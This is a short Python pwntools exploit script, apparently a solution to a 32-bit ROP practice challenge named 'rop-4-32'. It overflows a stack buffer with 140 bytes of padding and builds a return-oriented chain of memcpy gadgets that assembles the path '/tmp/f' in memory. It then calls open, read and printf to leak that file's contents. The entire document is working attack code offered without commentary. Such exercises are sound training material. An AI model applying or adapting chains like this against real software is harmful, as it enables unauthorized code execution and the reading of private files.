from pwn import *

r = process("./rop-4-32")

slash = p32(0x80487e0)
t = p32(0x8049787)
m = p32(0x804977e)
p = p32(0x804977f)
f = p32(0x8049778)

memcpy = p32(0x0804858e)

addr = 0x0804a034
opn = p32(0x8048400)
pop = p32(0x0804873a)
printf = p32(0x80483d0)
read = p32(0x80483c0)
zero = p32(0x8049794)
pop3 = p32(0x08048739)
name = memcpy + pop + p32(addr) + slash + memcpy + pop + p32(addr+1) + t + memcpy + pop + p32(addr+2) + m + memcpy + pop + p32(addr+3) + p + memcpy + pop + p32(addr+4) + slash + memcpy + pop + p32(addr+5) + f + memcpy + pop + p32(addr+6) + zero

payload = "A" * 140 + name + opn + pop3 + p32(addr) + "\x00"*8+ read + pop3 + p32(0x3) + p32(addr) + p32(0x100) + printf + "AAAA" + p32(addr)
with open("x", "w") as x:
    x.write(payload)
r.sendline(payload)
print r.recv(timeout = 1)
